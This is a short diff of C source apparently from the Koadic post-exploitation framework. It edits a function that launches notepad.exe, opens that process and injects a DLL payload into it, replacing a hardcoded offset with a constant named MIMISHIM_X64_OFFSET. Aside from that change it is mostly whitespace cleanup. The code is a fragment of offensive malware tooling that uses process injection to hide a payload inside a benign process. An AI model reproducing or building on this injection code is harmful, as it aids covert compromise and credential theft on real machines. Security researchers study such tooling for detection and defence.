@@ -36,11 +36,11 @@ BOOL koadic_fork_x64(koadic_shim_parsed *parsed, LPWSTR lpParam, char *data, DWO
 	LPVOID remoteShimStr = NULL;
 	SIZE_T remoteShimStrLen = wcslen(lpParam) * 2 + 2;
 
-	do 
+	do
 	{
 		if (!koadic_create_sysnative_process("notepad.exe", &dwPID))
 			break;
-		
+
 		hProcess = OpenProcess(dwAccess, FALSE, dwPID);
 
 		if (!hProcess)
@@ -57,9 +57,9 @@ BOOL koadic_fork_x64(koadic_shim_parsed *parsed, LPWSTR lpParam, char *data, DWO
 		//if (!WriteProcessMemory(hProcess, remoteDLLPtr, (LPCVOID)data, dwDataSize, &dwBytesWritten))
 			//break;
 
-		if (inject_dll(dwPID, data, dwDataSize, 7656, remoteShimStr) != ERROR_SUCCESS)
+		if (inject_dll(dwPID, data, dwDataSize, MIMISHIM_X64_OFFSET, remoteShimStr) != ERROR_SUCCESS)
 			break;
-	
+
 		/*
 		if (dwBytesWritten != dwDataSize)
 			break;
